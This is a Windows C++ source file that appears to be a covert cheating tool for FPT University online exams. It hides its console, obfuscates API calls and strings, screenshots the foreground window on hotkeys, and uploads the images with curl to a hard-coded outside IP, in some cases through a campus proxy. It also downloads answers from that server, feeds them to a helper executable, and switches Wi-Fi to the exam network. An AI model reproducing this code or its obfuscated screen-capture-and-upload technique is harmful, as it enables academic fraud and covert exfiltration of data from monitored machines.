
#include <iostream>
#include <windows.h>
#include <string>
#include <GdiPlus.h>
#include <tchar.h>
#include <fstream>
#include <SensAPI.h>
#include <SensEvts.h>
#include <string>
#include <filesystem>
#include <math.h>
#include <CommCtrl.h>
#include <vector>
#include <direct.h>
#include "o.h"
#include <wlanapi.h>
#include "c.h"
#include <conio.h>
#include <ShlObj.h>
#include <ShlObj_core.h>
#include <wininet.h>
#include <cstdlib>
#include <sstream>
#pragma comment(lib,"Wininet.lib")
#pragma comment( lib, "gdiplus" )
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma warning(disable:4996)
HHOOK hHook;
using Find_Window_WINAPI = HWND(LPCSTR, LPCSTR);
using Set_WinText_WINAPI = BOOL(HWND, LPCSTR);
using Move_Win_WINAPI = BOOL(HWND, int, int, int, int, BOOL);
using Set_WinHook_WINAPI = HHOOK(int, HOOKPROC, HINSTANCE, DWORD);
using Get_AsyncKey_WINAPI = SHORT(int);
using Get_Console_WINAPI = HWND();
using Show_Win_WINAPI = BOOL(HWND, int);
using Set_CursorPos_WINAPI = BOOL(int, int);
using Get_CursorPos_WINAPI = BOOL(LPPOINT);
using Is_Admin = BOOL();
const auto s_wint = WinApiImport<Set_WinText_WINAPI>::get(AY_OBFUSCATE("SetWindowTextA"), AY_OBFUSCATE("User32.dll"));
struct Pos
{
	int x = 0;
	int y = 0;
};
int sen = -1;
int type = 1;
//-----------------KEYBOARD CONFIG------------

//-----------------------------------------
std::string sx[50];
Pos pos[50];
bool active = false;
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
const auto gcs_w = WinApiImport<Get_Console_WINAPI>::get(AY_OBFUSCATE("GetConsoleWindow"), AY_OBFUSCATE("Kernel32.dll"));
const auto sw = WinApiImport<Show_Win_WINAPI>::get(AY_OBFUSCATE("ShowWindow"), AY_OBFUSCATE("User32.dll"));
int l = 0;
LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	printf("\nTest %d", l++);
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT*pKB = (KBDLLHOOKSTRUCT*)lParam;
		if (pKB->vkCode == VK_TAB)
		{
			
		}
	}
	return	 CallNextHookEx(hHook, nCode, wParam, lParam);
}
HINSTANCE g_hInst = NULL;
void take_picture(int &i)
{
	using namespace Gdiplus;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	HDC scrdc, memdc;
	HBITMAP membit;
	RECT rc;
	HWND eos = GetForegroundWindow();
	GetClientRect(eos, &rc);
	scrdc = ::GetDC(eos);
	memdc = CreateCompatibleDC(scrdc);
	int Width = rc.right - rc.left;
	int Height = rc.bottom - rc.top - 150;
	membit = CreateCompatibleBitmap(scrdc, Width, Height);
	HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
	BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 125, SRCCOPY);

	Gdiplus::Bitmap bitmap(membit, NULL);
	CLSID clsid;
	EncoderParameters encoderParameters;
	ULONG             quality;
	Status            stat;

	GetEncoderClsid(L"image/jpeg", &clsid);
	encoderParameters.Count = 1;
	encoderParameters.Parameter[0].Guid = EncoderQuality;
	encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParameters.Parameter[0].NumberOfValues = 1;
	quality = 25;
	encoderParameters.Parameter[0].Value = &quality;
	std::string file;

	const char *x = AY_OBFUSCATE("cap");
	const char *x2 = AY_OBFUSCATE(".jpeg");
	file = x + std::to_string(i) + x2;
	std::wstring wfile(file.begin(), file.end());
	bitmap.Save(wfile.c_str(), &clsid, &encoderParameters);

	SelectObject(memdc, hOldBitmap);
	DeleteObject(memdc);

	DeleteObject(membit);

	::ReleaseDC(0, scrdc);
	file = x + std::to_string(i);
	char cmd[512];
	sprintf(cmd, "conhost -q 1 -m 6 -segments 1 %s.jpeg -o %s.webp", file, file);
	//sprintf(cmd, "conhost %s.jpeg -o %s.webp", file, file);
	system(cmd);

	sprintf(cmd, "del %s.jpeg", file);

	system(cmd);
	i++;
}

double distance(int x1, int y1, int x2, int y2)
{
	// Calculating distance
	return sqrt(pow(x2 - x1, 2) +
		pow(y2 - y1, 2) * 1.0);
}
std::string GetCurrentDirectory()
{
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");

	return std::string(buffer).substr(0, pos);
}
std::vector < std::string > vec_file(std::string folder)
{
	std::vector<std::string> names;
	std::string search_path = GetCurrentDirectory() + "/*.webp";
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
				names.push_back(fd.cFileName);
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
	}
	return names;
}

void gdiscreen()
{

	const auto f_win = WinApiImport<Find_Window_WINAPI>::get(AY_OBFUSCATE("FindWindowA"), AY_OBFUSCATE("User32.dll"));
	const auto s_wint = WinApiImport<Set_WinText_WINAPI>::get(AY_OBFUSCATE("SetWindowTextA"), AY_OBFUSCATE("User32.dll"));
	const auto m_win = WinApiImport<Move_Win_WINAPI>::get(AY_OBFUSCATE("MoveWindow"), AY_OBFUSCATE("User32.dll"));
	const auto shook_win = WinApiImport<Set_WinHook_WINAPI>::get(AY_OBFUSCATE("SetWindowsHookExA"), AY_OBFUSCATE("User32.dll"));
	const auto get_key = WinApiImport<Get_AsyncKey_WINAPI>::get(AY_OBFUSCATE("GetAsyncKeyState"), AY_OBFUSCATE("User32.dll"));

	int i = 0;
	int k = 0;
	bool toggle = true;
	POINT p;
	int c = 0;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	
	bool found = false;
	std::string s;
	std::fstream newfile;
	std::fstream newfile2;
	char cmd[500];
	int total_file_uploaded = 0;
	int total_time_exit = 0;
	std::vector <std::string> uploaded_file;
	int vk = GetSystemMetrics(SM_SWAPBUTTON) ? VK_RBUTTON : VK_LBUTTON;
	while (true)
	{
		
		hHook = shook_win(WH_KEYBOARD_LL, (HOOKPROC)KeyHookProc, 0, 0);
		
		if (get_key(VK_F6))//Connect to wifi dh
		{
			//DH-FPT
			//FPTU_Student
			//FU-Students
			//FPT University
			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name="DH-FPT" interface="Wi-Fi")"));
			type = 1;
			Sleep(100);
		}
		if (get_key(VK_F8))//Connect to wifi exam
		{
			//FPTU-EXAMONLINE
			//FU-Exam
			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name="FPTU-EXAMONLINE" interface="Wi-Fi")"));
		
			Sleep(100);
		}
		if (get_key(VK_F7))//Connect to wifi exam
		{
			system(AY_OBFUSCATE(R"("netsh wlan disconnect interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
			system(AY_OBFUSCATE(R"("netsh wlan connect name= "v983" interface="Wi-Fi")"));
			type = 2;
			Sleep(100);
		}
		if (get_key((VK_F5)) && toggle)
		{
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			std::uintmax_t size = 0;
			if(std::filesystem::exists("work.txt")) size = std::filesystem::file_size("work.txt");
			sprintf(cmd, "t3.exe a%d,b%d,c%dB",i, total_file_uploaded, size);
			if (!CreateProcess(NULL, cmd,NULL,  NULL, FALSE, 0,NULL, NULL,&si, &pi))
			Sleep(100);
		}
		if (get_key(VK_RBUTTON))
		{
			system("taskkill /F /T /IM t3.exe");
			system("taskkill /F /T /IM t3.exe");

			Sleep(100);
		}
		if (get_key(VK_INSERT) || get_key(VK_F9))
		{
			std::string file;
			int n = vec_file("").size();
			sprintf(cmd, AY_OBFUSCATE(R"(netsh wlan show interface | Findstr /c:"SSID" > wlan.txt)"));
			system(cmd);
			std::string name_wifi;
			std::string ssid1 = "DH-FPT";
			newfile2.open("wlan.txt", std::ios::in);
			if (newfile2.is_open())
			{
				getline(newfile2, name_wifi);
				if (name_wifi.find(ssid1) != std::string::npos)
				{
					type = 1;
				}
				else type = 2;
				printf("Name wifi:%s & type = %d\n", name_wifi.c_str(),type);

			}
			newfile2.close();
			system("del wlan.txt");
			printf("-------------------------\n");
			for (int j = 0; j <n; j++)
			{
				s = "";
				//curl --proxy 10.22.194.46:8080http://103.143.143.227/up.php?floder="uploads/abc/" -F "uploadedfile=@cap7.webp"
				//sprintf(cmd, AY_OBFUSCATE(R"("t2 -F "uploadedfile=@%s.webp" http://103.143.143.227/up.php?floder="uploads/abc/"")"), file);
				if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
				else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 http://103.143.143.227:80/up.php?floder="uploads/new_hl839/" -F "uploadedfile=@%s" -o stats.txt")"), vec_file("")[j]);
				if(!std::count(uploaded_file.begin(), uploaded_file.end(), vec_file("")[j])) system(cmd);
				else continue;
				newfile2.open("stats.txt", std::ios::in);
				if (newfile2.is_open())
				{
					getline(newfile2, s);
					if (s.length() > 0 && !std::count(uploaded_file.begin(),uploaded_file.end(),vec_file("")[j]))
					{
						total_file_uploaded++;
						uploaded_file.push_back(vec_file("")[j]);
					}
					newfile2.close();
				}
				printf("%s", s);
				system("del stats.txt");
				printf("\n");
				Sleep(50);
			}
			Sleep(200);
		}
		if (get_key(VK_F4))
		{
			sprintf(cmd, AY_OBFUSCATE(R"(netsh wlan show interface | Findstr /c:"SSID" > wlan.txt)"));
			system(cmd);
			std::string name_wifi;
			std::string ssid1 = "DH-FPT";
			newfile2.open("wlan.txt", std::ios::in);
			if (newfile2.is_open())
			{
				getline(newfile2, name_wifi);
				if (name_wifi.find(ssid1) != std::string::npos)
				{
					type = 1;
				}
				else type = 2;
				printf("Name wifi:%s & type = %d\n", name_wifi.c_str(), type);

			}
			newfile2.close();
			system("del wlan.txt");
			printf("------------------------DOWNLOAD------------------\n");
			char cmd[500];
			if(type==1) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 20 --proxy 10.22.194.46:8080 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
			else if(type==2) sprintf(cmd, AY_OBFUSCATE(R"("curl -m 25 http://103.143.143.227/new_hl839.txt -o "work.txt"")"));
			system(cmd);
			printf("--------------------------------------------------");
			Sleep(100);	
		}

		if (get_key(VK_OEM_3) || get_key(VK_LMENU))
		{
			take_picture(i);
			Sleep(100);
		}
		if (get_key(VK_F12))
		{
			total_time_exit++;
			if (total_time_exit >= 3)
			{
				toggle = !toggle;
				total_time_exit = 0;
			}
			Sleep(100);
		}
		if ( (get_key(VK_MBUTTON) ||get_key(VK_RMENU) || get_key(VK_LSHIFT)) && toggle)
		{
			Sleep(200);
			newfile.open("work.txt", std::ios::in);
			if (newfile.is_open())
			{
				k = 0;
				s = "";
				while (std::getline(newfile, s))
				{
					sx[k] = "";
					s[s.length()] = '\0';
					sx[k] = s;
					k++;
				}
				sen = k;
				newfile.close();
			}
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			std::cout << sx[c].c_str() <<std::endl;
			sprintf(cmd, R"(C:\\Windows\\System32\\cmd.exe /C t3.exe "%s")", sx[c].c_str());
			std::cout << cmd << std::endl;
			if (!CreateProcess(NULL,   // No module name (use command line)
				cmd,        // Command line
				NULL,           // Process handle not inheritable
				NULL,           // Thread handle not inheritable
				FALSE,          // Set handle inheritance to FALSE
				0,              // No creation flags
				NULL,           // Use parent's environment block
				NULL,           // Use parent's starting directory 
				&si,            // Pointer to STARTUPINFO structure
				&pi)           // Pointer to PROCESS_INFORMATION structure
				)
			printf("%s\n", sx[c]);
			c++;
			if (c >= sen) c = 0;
			Sleep(100);
		}
		system("");
		Sleep(100);
	}
}



int main()
{
	const auto is_admin = WinApiImport<Is_Admin>::get(AY_OBFUSCATE("IsUserAnAdmin"), AY_OBFUSCATE("Shell32.dll"));
	if (!is_admin())
	{
		printf(AY_OBFUSCATE("Please run as admin"));
		_getch();
	}
	else
	{
		std::string key;
		printf(AY_OBFUSCATE("key:"));
		std::cin >> key;
		const char *x = AY_OBFUSCATE("new_hl839");
		if (key == x)
		{
			printf(AY_OBFUSCATE("\nKey cua ban hop le"));
			Sleep(2000);
			s_wint(gcs_w(), "");
		    sw(gcs_w(), SW_HIDE);
			//HHOOK mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseHookProc, NULL, NULL);
			gdiscreen();
		}
		else
		{
			printf(AY_OBFUSCATE("\nKey cua ban da nhap sai"));
			_getch();
		}
	}
	return 0;
}
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	using namespace Gdiplus;
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}
	}
	free(pImageCodecInfo);
	return 0;
}